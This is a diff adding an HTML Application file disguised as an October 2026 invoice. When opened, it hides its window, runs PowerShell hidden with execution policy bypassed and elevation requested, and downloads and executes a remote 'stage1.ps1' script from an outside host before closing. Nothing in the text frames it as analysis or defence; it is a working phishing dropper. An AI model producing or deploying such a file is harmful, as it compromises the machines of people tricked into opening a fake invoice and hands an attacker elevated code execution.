@@ -1,0 +1,10 @@
+<html>
+<head>
+<title>Invoice October 2026</title>
+<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
+<script language="VBScript">
+    Set Shell = CreateObject("Shell.Application")
+    Shell.ShellExecute "powershell.exe", "-WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.100:8000/stage1.ps1')""", "", "runas", 0
+    window.close()
+</script>
+</html>
